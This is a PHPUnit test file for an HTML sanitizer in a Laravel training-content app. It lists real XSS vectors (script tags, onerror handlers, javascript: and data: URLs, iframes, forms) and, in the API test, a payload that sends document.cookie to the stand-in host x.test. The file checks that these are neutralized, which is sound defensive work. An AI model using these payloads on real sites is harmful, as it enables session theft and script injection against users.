<?php

namespace Tests\Feature\Api;

use App\Models\InteractionPoint;
use App\Support\HtmlSur;
use Database\Seeders\AtelierMaintenanceSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * Étape 10.9 — Purification du HTML pédagogique.
 *
 * Chaque cas ci-dessous est un vecteur d'injection **réel**, pas un exemple
 * théorique : ce sont ceux qui traversent les filtres écrits à coups
 * d'expressions régulières.
 */
class HtmlSurTest extends TestCase
{
    use RefreshDatabase;

    /**
     * @return list<array{0: string, 1: string}>
     */
    public static function vecteurs(): array
    {
        return [
            'balise script' => ['<p>Avant</p><script>alert(1)</script><p>Après</p>', 'alert(1)'],
            'script sans espace' => ['<script src=//x.test/a.js></script>', 'x.test'],
            'gestionnaire onerror' => ['<img src=x onerror=alert(1)>', 'onerror'],
            'gestionnaire onload sur svg' => ['<svg/onload=alert(1)>', 'onload'],
            'onclick sur balise permise' => ['<p onclick="voler()">Texte</p>', 'onclick'],
            'href javascript' => ['<a href="javascript:alert(1)">Lien</a>', 'javascript:'],
            'href javascript en casse mixte' => ['<a href="JaVaScRiPt:alert(1)">Lien</a>', 'avascript'],
            'href data' => ['<a href="data:text/html;base64,PHNjcmlwdD4=">Lien</a>', 'data:'],
            'src data sur image' => ['<img src="data:text/html,<script>alert(1)</script>">', 'data:'],
            'iframe' => ['<iframe src="//x.test"></iframe>', 'iframe'],
            'object' => ['<object data="//x.test"></object>', 'object'],
            'style' => ['<style>body{display:none}</style>', 'display:none'],
            'attribut style' => ['<p style="position:fixed;inset:0">Texte</p>', 'position:fixed'],
            'form' => ['<form action="//x.test"><input name="mdp"></form>', 'x.test'],
            'balise interdite suivie d’un script' => ['<marquee></marquee><script>alert(1)</script>', 'alert(1)'],
        ];
    }

    // PHPUnit 12 a supprimé les annotations : le fournisseur se déclare par
    // attribut, et un `@dataProvider` oublié laisse le test échouer bruyamment
    // plutôt que de passer à vide.
    #[DataProvider('vecteurs')]
    public function test_les_vecteurs_d_injection_sont_neutralises(string $entree, string $interdit): void
    {
        $purifie = (string) HtmlSur::purifier($entree);

        $this->assertStringNotContainsStringIgnoringCase(
            $interdit,
            $purifie,
            "Le vecteur a survécu à la purification : {$entree}"
        );
    }

    /**
     * ⚠️ Le piège de la collection vivante.
     *
     * `childNodes` est une NodeList vivante : remplacer un nœud pendant
     * l'itération décale les indices et fait sauter le suivant. Un `<script>`
     * placé juste après une balise interdite survivrait alors au filtre.
     */
    public function test_un_script_apres_une_balise_interdite_ne_survit_pas(): void
    {
        $purifie = (string) HtmlSur::purifier(
            '<center>a</center><script>alert(1)</script><center>b</center><script>alert(2)</script>'
        );

        $this->assertStringNotContainsString('alert', $purifie);
        $this->assertStringContainsString('a', $purifie);
        $this->assertStringContainsString('b', $purifie);
    }

    /**
     * Une balise interdite disparaît, mais son TEXTE reste : supprimer le
     * sous-arbre entier ferait perdre du contenu pédagogique légitime à cause
     * d'une simple balise inconnue.
     */
    public function test_le_texte_d_une_balise_interdite_est_conserve(): void
    {
        $purifie = (string) HtmlSur::purifier('<p>Le couple de <marquee>serrage</marquee> est de 25 N·m</p>');

        $this->assertStringContainsString('serrage', $purifie);
        $this->assertStringNotContainsString('marquee', $purifie);
    }

    /** Sauf pour un script : son « texte » est du code. */
    public function test_le_contenu_d_un_script_n_est_PAS_conserve(): void
    {
        $purifie = (string) HtmlSur::purifier('<p>Avant</p><script>document.cookie</script>');

        $this->assertStringContainsString('Avant', $purifie);
        $this->assertStringNotContainsString('document.cookie', $purifie);
    }

    public function test_le_contenu_pedagogique_legitime_traverse_intact(): void
    {
        $entree = '<p><strong>Rôle.</strong> La volute convertit la vitesse en pression.</p>'
            .'<ul><li>Absence de fuite</li><li>Serrage au couple prescrit</li></ul>'
            .'<table><thead><tr><th scope="col">Diamètre</th></tr></thead>'
            .'<tbody><tr><td colspan="2">M12</td></tr></tbody></table>'
            .'<p class="securite">⚠️ Consigner avant toute intervention.</p>';

        $purifie = (string) HtmlSur::purifier($entree);

        foreach (['<strong>', '<ul>', '<li>', '<table>', 'scope="col"', 'colspan="2"', 'class="securite"'] as $attendu) {
            $this->assertStringContainsString($attendu, $purifie);
        }

        // Les accents doivent survivre : DOMDocument suppose du Latin-1 sans
        // déclaration d'encodage, et produirait du mojibake.
        $this->assertStringContainsString('Diamètre', $purifie);
        $this->assertStringContainsString('⚠️', $purifie);
    }

    public function test_un_lien_externe_recoit_noopener(): void
    {
        $purifie = (string) HtmlSur::purifier('<a href="https://exemple.fr">Fiche</a>');

        $this->assertStringContainsString('target="_blank"', $purifie);
        $this->assertStringContainsString('rel="noopener noreferrer"', $purifie);
    }

    public function test_une_url_relative_reste_autorisee(): void
    {
        $purifie = (string) HtmlSur::purifier('<img src="/images/epi.webp" alt="EPI">');

        $this->assertStringContainsString('/images/epi.webp', $purifie);
        $this->assertStringContainsString('alt="EPI"', $purifie);
    }

    // ---------------------------------------------------------------- API

    /**
     * 🔒 Le contrôle qui compte : la purification s'applique bien sur le chemin
     * réel, la ressource API — pas seulement dans un test unitaire.
     */
    public function test_l_api_ne_sert_jamais_de_html_non_purifie(): void
    {
        $this->seed(AtelierMaintenanceSeeder::class);

        // Un contenu empoisonné est injecté directement en base, comme le
        // ferait un back-office compromis ou une migration de données.
        $poste = InteractionPoint::query()->where('code', 'POI_01')->firstOrFail();

        $poste->update([
            'activity_payload' => array_merge($poste->activity_payload ?? [], [
                'bodyHtml' => '<p>Consignes</p><script>fetch("//x.test?c="+document.cookie)</script>'
                    .'<img src=x onerror="alert(1)"><a href="javascript:alert(2)">piège</a>',
            ]),
        ]);

        $corps = $this->getJson('/api/environments/atelier-maintenance-01')->assertOk()->getContent();

        foreach (['<script', 'onerror', 'javascript:', 'x.test', 'document.cookie'] as $interdit) {
            $this->assertStringNotContainsStringIgnoringCase($interdit, $corps);
        }

        // Le contenu légitime, lui, est bien passé.
        $this->assertStringContainsString('Consignes', $corps);
    }
}
